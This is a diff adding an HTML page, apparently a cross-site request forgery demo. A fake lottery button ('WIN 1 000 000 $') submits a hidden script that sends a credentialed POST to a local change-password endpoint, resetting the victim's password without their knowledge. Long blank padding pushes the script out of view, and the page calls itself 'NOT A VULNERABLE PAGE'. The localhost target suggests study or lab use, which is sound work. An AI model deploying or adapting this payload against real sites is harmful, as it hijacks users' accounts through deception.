@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Extremely useful information </title>
+</head>
+<body>
+<h1>IT IS NOT A VULNERABLE PAGE</h1>
+</body>
+<form id="lottery-form">
+    <button type="submit">WIN 1 000 000 $</button>
+</form>
+<script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    document.querySelector("form#lottery-form").onsubmit = e => {
+        e.preventDefault();
+        fetch("http://localhost:8080/user/change-password?newPassword=changed-password",
+            {method: 'post', credentials: 'include'})
+            .then(res => {
+                console.log("YOU ARE WINNER!!")
+            })
+    }
+
+</script>
+</html>
